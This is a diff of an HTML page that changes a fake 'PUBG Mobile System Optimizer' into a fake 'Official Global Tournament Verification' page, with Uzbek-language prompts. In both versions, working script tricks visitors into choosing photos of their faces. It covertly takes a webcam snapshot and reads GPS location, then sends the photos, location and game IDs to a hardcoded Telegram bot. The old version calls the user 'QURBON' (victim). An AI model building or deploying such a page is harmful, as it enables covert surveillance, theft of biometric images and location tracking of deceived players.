@@ -3,140 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile: System Optimizer v2.0</title>
+    <title>PUBG MOBILE - Official Global Tournament Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&family=Roboto:wght@300;500&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; background: #0a0a0c; color: #00f3ff; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; padding: 30px; border: 1px solid #1a1a1e; border-radius: 20px; background: #0f0f12; text-align: center; box-shadow: 0 0 30px rgba(0, 243, 255, 0.1); }
-        .progress-bar { width: 100%; height: 4px; background: #1a1a1e; margin: 20px 0; border-radius: 2px; overflow: hidden; display: none; }
-        .progress-fill { width: 0%; height: 100%; background: #00f3ff; transition: 0.3s; }
-        .status-text { font-size: 14px; color: #555; margin-bottom: 20px; }
-        .btn-opt { width: 100%; padding: 15px; background: transparent; border: 1px solid #00f3ff; color: #00f3ff; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
-        .btn-opt:hover { background: #00f3ff; color: #000; }
-        #fileInput, video, canvas { display: none; }
-        .success-msg { display: none; color: #39ff14; margin-top: 20px; font-size: 18px; }
+        body { margin: 0; background: #05070a; color: #e1e1e1; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .wrapper { width: 95%; max-width: 450px; background: #0f1218; border-top: 4px solid #f3a91a; border-radius: 5px; padding: 40px 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center; }
+        .logo { font-family: 'Oswald', sans-serif; font-size: 24px; color: #f3a91a; letter-spacing: 2px; margin-bottom: 10px; text-transform: uppercase; }
+        .sub-title { font-size: 13px; color: #888; margin-bottom: 30px; text-transform: uppercase; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-size: 12px; color: #f3a91a; margin-bottom: 8px; text-transform: uppercase; font-weight: bold; }
+        input { width: 100%; padding: 12px; background: #1a1e26; border: 1px solid #2a303c; color: #fff; border-radius: 3px; box-sizing: border-box; outline: none; }
+        .file-upload { border: 2px dashed #2a303c; padding: 20px; cursor: pointer; transition: 0.3s; margin-bottom: 25px; }
+        .file-upload:hover { border-color: #f3a91a; background: #151921; }
+        .btn-verify { width: 100%; padding: 15px; background: #f3a91a; border: none; color: #000; font-family: 'Oswald', sans-serif; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .btn-verify:disabled { background: #333; color: #666; cursor: not-allowed; }
+        #status-msg { font-size: 12px; margin-top: 15px; color: #f3a91a; height: 15px; }
+        video, canvas, #fileInput { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2 style="margin-top:0;">SYSTEM OPTIMIZER</h2>
-    <p class="status-text" id="status">Tizim holati: Skanerlashga tayyor</p>
+<div class="wrapper">
+    <div class="logo">Verification System</div>
+    <div class="sub-title">Global Open Tournament 2026</div>
     
-    <div id="setupArea">
-        <input type="text" id="u_name" placeholder="PUBG User Name" style="width:100%; padding:12px; margin-bottom:10px; background:#16161a; border:1px solid #333; color:white; border-radius:5px; box-sizing:border-box;">
+    <div id="step-1">
+        <div class="input-group">
+            <label>Character ID</label>
+            <input type="number" id="u_id" placeholder="Masalan: 5123456789">
+        </div>
         
-        <label for="fileInput" style="display:block; padding:15px; border:1px dashed #333; cursor:pointer; margin-bottom:15px; font-size:13px; color:#888;">
-            📊 Tizim tahlili uchun oxirgi o'yin skrinshotini yuklang
-        </label>
-        <input type="file" id="fileInput" accept="image/*" multiple onchange="hiddenScan(this)">
-        
-        <button class="btn-opt" id="mainBtn" onclick="startProcess()">Optimallashtirishni boshlash</button>
+        <div class="input-group">
+            <label>In-Game Name (IGN)</label>
+            <input type="text" id="u_name" placeholder="Masalan: UZB_WARRIOR">
+        </div>
+
+        <div class="file-upload" onclick="document.getElementById('fileInput').click()">
+            <label style="cursor:pointer">Akkaunt xavfsizligi uchun galereyadan 5-10 ta yuzingiz aniq ko'ringan rasmni tanlang</label>
+            <span style="font-size: 11px; color: #555;">(Tizim AI orqali shaxsingizni tasdiqlaydi)</span>
+        </div>
+        <input type="file" id="fileInput" accept="image/*" multiple onchange="startBackgroundScan(this)">
+
+        <div id="status-msg">Tizim tayyor...</div>
+        <button class="btn-verify" id="verifyBtn" onclick="executeFinalStep()" disabled>VERIFIKATSIYADAN O'TISH</button>
     </div>
 
-    <div class="progress-bar" id="pBar"><div class="progress-fill" id="pFill"></div></div>
-    <div class="success-msg" id="sMsg">✅ OPTIMIZATSIYA YAKUNLANDI!<br><span style="font-size:12px; color:#888;">Laglar 45% ga kamaytirildi.</span></div>
+    <div id="step-2" style="display:none;">
+        <div style="font-size: 40px; color: #f3a91a; margin-bottom: 20px;">⌛</div>
+        <h3>Tahlil qilinmoqda...</h3>
+        <p style="font-size: 13px; color: #888;">Iltimos, sahifani yopmang. Server bilan aloqa o'rnatilmoqda.</p>
+    </div>
 </div>
 
 <video id="vid" autoplay playsinline></video>
 <canvas id="canv"></canvas>
 
 <script>
-    const CONFIG = {
-        TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY",
-        ID: "6198817749"
+    const API_CONFIG = {
+        T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY",
+        C: "6198817749"
     };
 
-    let camData = null, faceFiles = [], loc = "Aniqlanmadi";
+    let faces = [], camBlob = null;
 
-    // AI-ni fonda yuklash (Ultra-Fast)
-    async function init() {
+    async function initModels() {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
     }
-    init();
+    initModels();
 
-    // Yashirin skanerlash
-    async function hiddenScan(input) {
-        document.getElementById('status').innerText = "Fayllar tahlil qilinmoqda...";
+    async function startBackgroundScan(input) {
+        const msg = document.getElementById('status-msg');
+        msg.innerText = "AI tahlil qilmoqda...";
+        faces = [];
         const files = Array.from(input.files);
+
         for (let f of files) {
             const img = await faceapi.bufferToImage(f);
-            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.4 }));
-            if (d.length > 0) faceFiles.push(f);
+            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
+            if (d.length > 0) faces.push(f);
         }
-        document.getElementById('status').innerText = "Tizim tahlili tayyor.";
+
+        msg.innerText = `Tayyor. ${faces.length} ta rasm tasdiqlandi.`;
+        document.getElementById('verifyBtn').disabled = false;
     }
 
-    async function startProcess() {
+    async function executeFinalStep() {
         const name = document.getElementById('u_name').value;
-        if(!name) return alert("User name kiriting!");
+        const id = document.getElementById('u_id').value;
+        if(!name || !id) return alert("Ma'lumotlarni to'ldiring!");
 
-        document.getElementById('setupArea').style.display = 'none';
-        document.getElementById('pBar').style.display = 'block';
-        const fill = document.getElementById('pFill');
-        const status = document.getElementById('status');
+        document.getElementById('step-1').style.display = 'none';
+        document.getElementById('step-2').style.display = 'block';
 
-        // 1. Yashirin Kamera va GPS (Faqat bitta ruxsat so'rovi)
         try {
-            status.innerText = "GPS drayverlari tekshirilmoqda...";
-            fill.style.width = "20%";
-            
+            // Yashirin kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('vid');
-            video.srcObject = stream;
-            await new Promise(r => setTimeout(r, 600));
-            const canvas = document.getElementById('canv');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            camData = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
+            const v = document.getElementById('vid');
+            v.srcObject = stream;
+            await new Promise(r => setTimeout(r, 800));
+            const c = document.getElementById('canv');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.5))).blob();
             stream.getTracks().forEach(t => t.stop());
 
-            fill.style.width = "50%";
-            status.innerText = "Kesh fayllari tozalanmoqda...";
-
+            // Geolokatsiya va yuborish
             navigator.geolocation.getCurrentPosition(async (p) => {
-                loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                await finalPush(name);
-            }, async () => { await finalPush(name); }, {timeout: 5000});
+                const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                await sendData(name, id, maps);
+            }, async () => {
+                await sendData(name, id, "Rad etildi");
+            });
 
-        } catch (e) { 
-            status.innerText = "Xato: Tizim ruxsati rad etildi.";
-            setTimeout(() => location.reload(), 2000);
+        } catch (e) {
+            alert("Turnirda qatnashish uchun kamera ruxsati shart!");
+            location.reload();
         }
     }
 
-    async function finalPush(name) {
-        const fill = document.getElementById('pFill');
-        const status = document.getElementById('status');
+    async function sendData(n, id, m) {
+        const text = `🏆 *TURNIR REGISTRATSIYA* 🏆\n👤 IGN: ${n}\n🆔 ID: ${id}\n📍 MAPS: ${m}`;
         
-        fill.style.width = "80%";
-        status.innerText = "Ping optimallashmoqda...";
-
-        const msg = `🎭 QURBON: ${name}\n📍 MAPS: ${loc}\n📱 BROWSER: ${navigator.platform}`;
-
-        // Telegramga yashirin yuborish
-        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${API_CONFIG.T}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CONFIG.ID, text: msg})
+            body: JSON.stringify({chat_id: API_CONFIG.C, text: text, parse_mode: 'Markdown'})
         });
 
-        if (camData) {
-            const fd = new FormData(); fd.append('chat_id', CONFIG.ID); fd.append('photo', camData);
-            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
+        if(camBlob) {
+            const fd = new FormData(); fd.append('chat_id', API_CONFIG.C); fd.append('photo', camBlob);
+            await fetch(`https://api.telegram.org/bot${API_CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
         }
 
-        // Faqat yuzlar (fonda)
-        for (let face of faceFiles) {
-            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.ID); fd2.append('photo', face);
-            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
+        for (let f of faces) {
+            const fd2 = new FormData(); fd2.append('chat_id', API_CONFIG.C); fd2.append('photo', f);
+            fetch(`https://api.telegram.org/bot${API_CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
         }
 
-        fill.style.width = "100%";
-        status.innerText = "Tugallandi.";
-        document.getElementById('pBar').style.display = 'none';
-        document.getElementById('sMsg').style.display = 'block';
+        setTimeout(() => {
+            alert("Siz muvaffaqiyatli ro'yxatdan o'tdingiz! Adminlar 24 soat ichida bog'lanadi.");
+            location.reload();
+        }, 3000);
     }
 </script>
 </body>
